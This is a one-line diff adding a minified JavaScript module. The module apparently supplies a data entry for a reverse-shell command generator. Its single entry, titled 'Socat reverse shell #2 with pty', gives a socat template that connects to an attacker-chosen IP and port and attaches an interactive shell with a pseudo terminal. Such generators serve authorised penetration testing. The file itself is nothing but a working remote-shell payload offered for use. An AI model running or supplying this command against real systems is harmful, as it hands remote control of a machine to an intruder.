@@ -1,0 +1,1 @@
+const e=[{title:"Socat reverse shell #2 with pty",template:"socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane",description:"Socat reverse shell with pseudo terminal and signal handling."}],t={commands:e};export{e as commands,t as default};
